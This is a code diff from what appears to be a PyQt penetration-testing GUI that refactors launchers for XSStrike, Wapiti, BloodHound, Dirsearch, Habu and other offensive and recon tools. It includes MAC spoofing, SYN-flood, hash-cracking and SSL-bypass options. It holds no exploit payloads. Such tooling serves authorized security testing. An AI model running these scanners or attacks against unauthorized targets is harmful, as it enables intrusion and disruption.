-                if not ok1:
-                    return
-
-                data, ok2 = QInputDialog.getText(
-                    self, "XSStrike POST Data",
-                    "POST body (leave blank for GET):",
-                    text=""
-                )
-                if not ok2:
-                    return
-
-                cookies, ok3 = QInputDialog.getText(
-                    self, "XSStrike Cookies",
-                    "Cookies (name=value; ... — leave blank to skip):",
-                    text=""
-                )
-                if not ok3:
-                    return
-
-                def _run_xsstrike():
-                    if not self.engines or "xsstrike" not in self.engines:
-                        self.log("[XSStrike] Engine not registered.", AETHER_COLORS["accent_error"])
-                        return
-
-                    xs = self.engines["xsstrike"]
-                    self.log(f"[XSStrike] Mode={mode.upper()} → {url}", AETHER_COLORS["accent_info"])
-
-                    from engines.base import Request as EngRequest
-                    req = EngRequest(
-                        target=url.strip(),
-                        params={
-                            "url":    url.strip(),
-                            "mode":   mode,
-                            "data":   data.strip(),
-                            "cookies": cookies.strip(),
-                        }
-                    )
-
-                    async def _stream():
-                        if not xs._ready:
-                            await xs.initialize()
-
-                        async for event in xs.stream(req):
-                            if event.kind == "progress":
-                                self.log(f"[XSS] {event.data}", AETHER_COLORS["accent_info"])
-                            elif event.kind == "result":
-                                # Colour by severity emitted from the engine
-                                sev_color = AETHER_COLORS["accent_primary"]
-                                if event.severity == "ALERT":
-                                    sev_color = AETHER_COLORS["accent_error"]
-                                elif event.severity == "WARN":
-                                    sev_color = AETHER_COLORS["accent_warning"]
-                                self.log(f"[XSS] {event.data}", sev_color)
-                            elif event.kind == "error":
-                                self.log(f"[XSS ERR] {event.data}", AETHER_COLORS["accent_error"])
-                            elif event.kind == "complete":
-                                self.log("[XSS] XSStrike scan complete.", AETHER_COLORS["accent_warning"])
-
-                    try:
-                        import asyncio
-                        asyncio.run(_stream())
-                    except Exception as e:
-                        self.log(f"XSStrike ERROR: {e}", AETHER_COLORS["accent_error"])
-
-                threading.Thread(target=_run_xsstrike, daemon=True).start()
+                url, ok = QInputDialog.getText(self, "XSStrike", "Target URL:", text="http://")
+                if ok:
+                    self._run_unified_engine("xsstrike", url)
 
             elif name == "HTTPIE":
-                self.log("[HTTPie] Initializing HTTP client...", AETHER_COLORS["cat_web"])
-
-                # ── Method ──────────────────────────────────────────────
-                methods = ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"]
-                method, ok0 = QInputDialog.getItem(
-                    self, "HTTPie", "HTTP Method:", methods, 0, False
-                )
-                if not ok0:
-                    return
-
-                url, ok1 = QInputDialog.getText(
-                    self, "HTTPie", "Target URL:", text="http://"
-                )
-                if not ok1 or not url.strip():
-                    self.log("[HTTPie] Aborted — no URL.", AETHER_COLORS["text_dim"])
-                    return
-
-                # ── Advanced options (auth, headers, body) ──────────────────
-                mode_choices = [
-                    "Basic Request",
-                    "With Auth (Basic)",
-                    "With Auth (Digest)",
-                    "With Auth (Bearer)",
-                    "Form POST",
-                    "JSON POST",
-                    "Custom Headers",
-                    "Download File",
-                    "Verbose (Full Request+Response)",
-                    "HTTPS SSL-bypass",
-                ]
-                mode, ok2 = QInputDialog.getItem(
-                    self, "HTTPie Mode", "Select mode:", mode_choices, 0, False
-                )
-                if not ok2:
-                    return
-
-                extra = ""
-                if mode in ("Form POST", "JSON POST"):
-                    extra, ok3 = QInputDialog.getText(
-                        self, "HTTPie Body",
-                        "Body fields (key=value key2=value2 ...):", text=""
-                    )
-                    if not ok3:
-                        return
-                elif "Auth" in mode:
-                    extra, ok3 = QInputDialog.getText(
-                        self, "HTTPie Auth", "Credentials (user:password or token):", text=""
-                    )
-                    if not ok3:
-                        return
-
-                def _run_httpie():
-                    if not self.engines or "httpie" not in self.engines:
-                        self.log("[HTTPie] Engine not registered.", AETHER_COLORS["accent_error"])
-                        return
-
-                    he = self.engines["httpie"]
-                    self.log(f"[HTTPie] {method} → {url} [{mode}]", AETHER_COLORS["accent_info"])
-
-                    # Build params from dialog choices
-                    from engines.base import Request as EngRequest
-                    params = {"method": method, "url": url.strip()}
-
-                    if mode == "Verbose (Full Request+Response)":
-                        params["verbose"] = True
-                    if mode == "HTTPS SSL-bypass":
-                        params["verify_ssl"] = False
-                    if mode == "Download File":
-                        params["download"] = True
-                    if mode == "Form POST" and extra.strip():
-                        fields = {}
-                        for item in extra.strip().split():
-                            if "=" in item:
-                                k, v = item.split("=", 1)
-                                fields[k] = v
-                        params["data"] = fields
-                        params["form"] = True
-                    if mode == "JSON POST" and extra.strip():
-                        fields = {}
-                        for item in extra.strip().split():
-                            if "=" in item:
-                                k, v = item.split("=", 1)
-                                fields[k] = v
-                        params["data"] = fields
-                        params["json_data"] = True
-                    if "Basic" in mode and extra.strip() and ":" in extra:
-                        u, p = extra.strip().split(":", 1)
-                        params["auth"] = [u, p]
-                        params["auth_type"] = "basic"
-                    if "Digest" in mode and extra.strip() and ":" in extra:
-                        u, p = extra.strip().split(":", 1)
-                        params["auth"] = [u, p]
-                        params["auth_type"] = "digest"
-                    if "Bearer" in mode and extra.strip():
-                        params["headers"] = {"Authorization": f"Bearer {extra.strip()}"}
-
-                    req = EngRequest(target=url.strip(), params=params)
-
-                    async def _stream():
-                        if not he._ready:
-                            await he.initialize()
-
-                        async for event in he.stream(req):
-                            if event.kind == "progress":
-                                self.log(f"[HTTP] {event.data}", AETHER_COLORS["accent_info"])
-                            elif event.kind == "result":
-                                sev_color = AETHER_COLORS["accent_primary"]
-                                if event.severity == "ALERT":
-                                    sev_color = AETHER_COLORS["accent_error"]
-                                elif event.severity == "WARN":
-                                    sev_color = AETHER_COLORS["accent_warning"]
-                                self.log(f"[HTTP] {event.data}", sev_color)
-                            elif event.kind == "error":
-                                self.log(f"[HTTP ERR] {event.data}", AETHER_COLORS["accent_error"])
-                            elif event.kind == "complete":
-                                self.log(f"[HTTP] {event.data}", AETHER_COLORS["accent_warning"])
-
-                    try:
-                        import asyncio
-                        asyncio.run(_stream())
-                    except Exception as e:
-                        self.log(f"HTTPie ERROR: {e}", AETHER_COLORS["accent_error"])
-
-                threading.Thread(target=_run_httpie, daemon=True).start()
+                url, ok = QInputDialog.getText(self, "HTTPie", "Target URL:", text="http://")
+                if ok:
+                    self._run_unified_engine("httpie", url)
 
             elif name == "WAPITI":
-                self.log("[WAPITI] Initializing web vulnerability scanner...", AETHER_COLORS["cat_web"])
-
-                url, ok0 = QInputDialog.getText(
-                    self, "Wapiti", "Target URL:", text="http://"
-                )
-                if not ok0 or not url.strip():
-                    return
-
-                scan_type, ok1 = QInputDialog.getItem(
-                    self, "Wapiti Phase", "Select Scan Type:", ["full", "crawl", "attack"], 0, False
-                )
-                if not ok1:
-                    return
-
-                # Auth details (optional)
-                auth_data, ok2 = QInputDialog.getText(
-                    self, "Wapiti Auth (Optional)", "Login Form URL (leave blank if none):", text=""
-                )
-                if not ok2:
-                    return
-                    
-                auth_post = ""
-                if auth_data.strip():
-                    auth_post, ok3 = QInputDialog.getText(
-                        self, "Wapiti Auth", "Login Form POST Data (e.g. user=admin&pass=123):", text=""
-                    )
-                    if not ok3:
-                        return
-
-                def _run_wapiti():
-                    if not self.engines or "wapiti" not in self.engines:
-                        self.log("[WAPITI] Engine not registered.", AETHER_COLORS["accent_error"])
-                        return
-
-                    we = self.engines["wapiti"]
-                    
-                    params = {
-                        "url": url.strip(),
-                        "scan_type": scan_type,
-                    }
-                    if auth_data.strip():
-                        params["auth_url"] = auth_data.strip()
-                        params["auth_data"] = auth_post.strip()
-
-                    from engines.base import Request as EngRequest
-                    req = EngRequest(target=url.strip(), params=params)
-
-                    async def _stream():
-                        if not we._ready:
-                            await we.initialize()
-
-                        async for event in we.stream(req):
-                            if event.kind == "progress":
-                                self.log(f"{event.data}", AETHER_COLORS["accent_info"])
-                            elif event.kind == "result":
-                                sev_color = AETHER_COLORS["accent_primary"]
-                                if event.severity == "ALERT":
-                                    sev_color = AETHER_COLORS["accent_error"]
-                                elif event.severity == "WARN":
-                                    sev_color = AETHER_COLORS["accent_warning"]
-                                self.log(f"{event.data}", sev_color)
-                            elif event.kind == "error":
-                                self.log(f"{event.data}", AETHER_COLORS["accent_error"])
-                            elif event.kind == "complete":
-                                self.log(f"{event.data}", AETHER_COLORS["accent_success"])
-
-                    try:
-                        import asyncio
-                        asyncio.run(_stream())
-                    except Exception as e:
-                        self.log(f"WAPITI ERROR: {e}", AETHER_COLORS["accent_error"])
-
-                threading.Thread(target=_run_wapiti, daemon=True).start()
+                url, ok = QInputDialog.getText(self, "Wapiti", "Target URL:", text="http://")
+                if ok:
+                    self._run_unified_engine("wapiti", url)
 
             elif name == "LIBDNET":
-                mode, ok0 = QInputDialog.getItem(self, "Libdnet Mode", "Select Operation:", ["arp_cache", "spoof_mac", "route_table"], 0, False)
-                if not ok0: return
-
-                req_params = {"mode": mode}
-                if mode == "spoof_mac":
-                    iface, ok1 = QInputDialog.getText(self, "Libdnet", "Interface (e.g. eth0):", text="eth0")
-                    mac, ok2 = QInputDialog.getText(self, "Libdnet", "New MAC:", text="00:11:22:33:44:55")
-                    if not (ok1 and ok2): return
-                    req_params["interface"] = iface
-                    req_params["new_mac"] = mac
-                
-                dlg = ToolExecutionDialog("LIBDNET", f"Localhost ({mode})", self)
-                from engines.base import Request as EngRequest
-                req = EngRequest(target="localhost", params=req_params)
-                worker = ToolEngineWorker(self.engines["libdnet"], req, parent=dlg)
-                worker.progress.connect(dlg.append_event)
-                worker.error.connect(dlg.execution_error)
-                worker.finished.connect(dlg.execution_finished)
-                worker.start()
-                dlg.exec()
+                self._run_unified_engine("libdnet", "localhost", {"mode": "arp_cache"})
 
             elif name == "DPKT":
                 pcap, ok = QInputDialog.getText(self, "DPKT", "Path to .pcap file:")
-                if not ok or not pcap: return
-
-                dlg = ToolExecutionDialog("DPKT Engine", pcap, self)
-                from engines.base import Request as EngRequest
-                req = EngRequest(target=pcap)
-                worker = ToolEngineWorker(self.engines["dpkt"], req, parent=dlg)
-                worker.progress.connect(dlg.append_event)
-                worker.error.connect(dlg.execution_error)
-                worker.finished.connect(dlg.execution_finished)
-                worker.start()
-                dlg.exec()
+                if ok:
+                    self._run_unified_engine("dpkt", pcap)
 
             elif name == "BLOODHOUND":
-                domain, ok = QInputDialog.getText(self, "BloodHound", "Target Domain (e.g. corp.local):")
-                if not ok or not domain: return
-                user, ok = QInputDialog.getText(self, "BloodHound", "Username (optional):")
-                if not ok: return
-                pw, ok = QInputDialog.getText(self, "BloodHound", "Password (optional):")
-                if not ok: return
-
-                dlg = ToolExecutionDialog("BloodHound.py", domain, self)
-                from engines.base import Request as EngRequest
-                req = EngRequest(target=domain, params={"username": user, "password": pw})
-                worker = ToolEngineWorker(self.engines["bloodhound"], req, parent=dlg)
-                worker.progress.connect(dlg.append_event)
-                worker.error.connect(dlg.execution_error)
-                worker.finished.connect(dlg.execution_finished)
-                worker.start()
-                dlg.exec()
+                domain, ok = QInputDialog.getText(self, "BloodHound", "Target Domain:")
+                if ok:
+                    self._run_unified_engine("bloodhound", domain)
 
             elif name == "SPOODLE":
                 target, ok = QInputDialog.getText(self, "Spoodle", "Target Domain:")
-                if not ok or not target: return
-
-                dlg = ToolExecutionDialog("Spoodle", target, self)
-                from engines.base import Request as EngRequest
-                req = EngRequest(target=target)
-                worker = ToolEngineWorker(self.engines["spoodle"], req, parent=dlg)
-                worker.progress.connect(dlg.append_event)
-                worker.error.connect(dlg.execution_error)
-                worker.finished.connect(dlg.execution_finished)
-                worker.start()
-                dlg.exec()
+                if ok:
+                    self._run_unified_engine("spoodle", target)
 
             elif name == "HABU":
-                cmd, ok = QInputDialog.getItem(self, "Habu", "Command:", ["habu.ping", "habu.synflood", "habu.arping", "habu.portscan"], 0, False)
+                modules = ["Network Recon (net)", "Crypto Ops (crypto)", "Fernet Symmetric (fernet)", "Asymmetric RSA (asym)", "Shodan OSINT (shodan)", "Censys OSINT (censys)"]
+                mod_choice, ok = QInputDialog.getItem(self, "Habu Engine", "Select Module:", modules, 0, False)
                 if not ok: return
-                target, ok = QInputDialog.getText(self, "Habu", "Target IP/Hostname:")
-                if not ok or not target: return
+                
+                module = mod_choice.split("(")[1].replace(")", "")
+                params = {"module": module}
+                target = None
 
-                dlg = ToolExecutionDialog("Habu Toolkit", target, self)
-                from engines.base import Request as EngRequest
-                req = EngRequest(target=target, params={"command": cmd})
-                worker = ToolEngineWorker(self.engines["habu"], req, parent=dlg)
-                worker.progress.connect(dlg.append_event)
-                worker.error.connect(dlg.execution_error)
-                worker.finished.connect(dlg.execution_finished)
-                worker.start()
-                dlg.exec()
+                if module == "net":
+                    target, ok = QInputDialog.getText(self, "Habu Network", "Target IP/Hostname:")
+                    if ok and target:
+                        ops, ok2 = QInputDialog.getText(self, "Habu Operations", "Operations (comma-separated: dns,geo,asn,ports,tcp_connect):", text="dns,geo,ports")
+                        if ok2: params["net_ops"] = [o.strip() for s in ops.split(",") for o in s.split() if o.strip()]
+                    else: return
+
+                elif module == "crypto":
+                    data, ok = QInputDialog.getText(self, "Habu Crypto", "Data Input (string or hash):")
+                    if ok and data:
+                        params["data_input"] = data
+                        ops, ok2 = QInputDialog.getText(self, "Habu Operations", "Operations (comma-separated: hash_all,identify,crack,b64_encode):", text="hash_all,identify")
+                        if ok2: params["crypto_ops"] = [o.strip() for s in ops.split(",") for o in s.split() if o.strip()]
+                    else: return
+
+                elif module == "fernet":
+                    ops = ["keygen", "encrypt", "decrypt"]
+                    op, ok = QInputDialog.getItem(self, "Habu Fernet", "Select Operation:", ops, 0, False)
+                    if ok:
+                        params["fernet_op"] = op
+                        if op in ("encrypt", "decrypt"):
+                            key, ok2 = QInputDialog.getText(self, "Habu Fernet", "Key:")
+                            if ok2 and key: params["fernet_key"] = key
+                            else: return
+                            
+                            prompt = "Plaintext:" if op == "encrypt" else "Ciphertext:"
+                            val, ok3 = QInputDialog.getText(self, "Habu Fernet", prompt)
+                            if ok3 and val:
+                                if op == "encrypt": params["plaintext"] = val
+                                else: params["ciphertext"] = val
+                            else: return
+                    else: return
+
+                elif module == "shodan":
+                    query, ok = QInputDialog.getText(self, "Habu Shodan", "Query (IP or Search):")
+                    if ok and query:
+                        params["shodan_query"] = query
+                        modes = ["host", "search", "count"]
+                        mode, ok2 = QInputDialog.getItem(self, "Habu Shodan", "Mode:", modes, 0, False)
+                        if ok2: params["shodan_mode"] = mode
+                    else: return
+
+                self._run_unified_engine("habu", target or "local", params, display_name=f"HABU:{module.upper()}")
 
             elif name == "DIRSEARCH":
                 url, ok = QInputDialog.getText(self, "Dirsearch", "Target URL:", text="http://")
-                if not ok or not url: return
-
-                dlg = ToolExecutionDialog("Dirsearch Brute", url, self)
-                from engines.base import Request as EngRequest
-                req = EngRequest(target=url)
-                worker = ToolEngineWorker(self.engines["dirsearch"], req, parent=dlg)
-                worker.progress.connect(dlg.append_event)
-                worker.error.connect(dlg.execution_error)
-                worker.finished.connect(dlg.execution_finished)
-                worker.start()
-                dlg.exec()
+                if ok:
+                    self._run_unified_engine("dirsearch", url)
 
             elif name == "SELENIUM":
                 url, ok = QInputDialog.getText(self, "Selenium", "Target URL:", text="http://")
-                if not ok or not url: return
-                
-                screen = QMessageBox.question(self, "Screenshot", "Take a snapshot on load?", QMessageBox.Yes | QMessageBox.No)
-
-                dlg = ToolExecutionDialog("Selenium Navigator", url, self)
-                from engines.base import Request as EngRequest
-                req = EngRequest(target=url, params={"screenshot": screen == QMessageBox.Yes})
-                worker = ToolEngineWorker(self.engines["selenium"], req, parent=dlg)
-                worker.progress.connect(dlg.append_event)
-                worker.error.connect(dlg.execution_error)
-                worker.finished.connect(dlg.execution_finished)
-                worker.start()
-                dlg.exec()
+                if ok:
+                    self._run_unified_engine("selenium", url)
 
             else:
                 self.log(f"[{name}] Module loaded.", AETHER_COLORS["accent_info"])
@@ -3229,7 +2576,9 @@ class SYMBIOTEApp(QMainWindow):
         self.settings = SettingsManager()
         
         self.engines = {
+            "packet": PacketEngine(),
             "template": TemplateEngine(),
+            "nmap": NmapEngine(),
             "network": NetworkScanner(),
             "web": WebScanner(),
             "waf": WafDetector(),
@@ -3475,7 +2824,9 @@ class SYMBIOTEApp(QMainWindow):
         l.setContentsMargins(30, 30, 30, 30)
         
         header = QHBoxLayout()
-        # Recon engine title removed
+        self.op_lbl = QLabel("READY FOR PROBE")
+        self.op_lbl.setStyleSheet(f"color: {AETHER_COLORS['accent_primary']}; font-weight: 700; letter-spacing: 2px;")
+        header.addWidget(self.op_lbl)
         header.addStretch()
         
         # Mode Selection
@@ -3620,7 +2971,7 @@ class SYMBIOTEApp(QMainWindow):
 
 
     def init_toolkit(self):
-        self.toolkit = ToolkitPage(log_terminal=self.term.log, engines=self.engines)
+        self.toolkit = ToolkitPage(parent_app=self)
         self.stack.addWidget(self.toolkit)
 
     def init_history(self):
